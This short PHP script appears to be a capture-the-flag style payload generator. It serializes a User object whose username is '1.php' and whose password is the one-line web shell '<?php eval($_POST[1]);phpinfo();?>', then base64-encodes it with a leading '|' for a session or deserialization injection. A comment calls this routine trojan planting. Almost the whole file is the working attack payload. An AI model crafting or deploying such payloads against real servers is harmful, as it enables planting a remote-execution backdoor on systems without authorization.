<?php
    class User{
        public $username;
        public $password;
        public $status;
        function __construct($username,$password){
            $this->username = $username;
            $this->password = $password;
        }
        function setStatus($s){
            $this->status=$s;
        }
  }

  $user = new User('1.php', '<?php eval($_POST[1]);phpinfo();?>'); //日常上木马
  echo base64_encode("|".serialize($user))
  // echo base64_encode('|'.serialize($user));
?>